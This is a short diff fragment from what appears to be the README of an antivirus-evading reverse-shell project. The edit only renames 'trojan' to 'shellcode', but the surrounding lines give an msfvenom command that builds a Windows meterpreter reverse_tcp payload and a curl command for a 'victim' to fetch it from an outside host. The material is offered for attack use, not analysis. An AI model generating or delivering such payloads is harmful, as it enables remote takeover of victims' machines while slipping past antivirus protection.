@@ -14,7 +14,7 @@ Obfuscated reverse-shell shellcode aimed to bypass signature-based antivirus
             
       $msfvenom -p windows/meterpreter/reverse_tcp lhost={IP of attacker} lport={port #} --format c -o payload-22.c -b "\x00\x0A\x0"
       
-  To download the trojan as a victim:
+  To download the shellcode as a victim:
     
       $curl bigbadcyborg.com/download.php > payload-22.txt
       
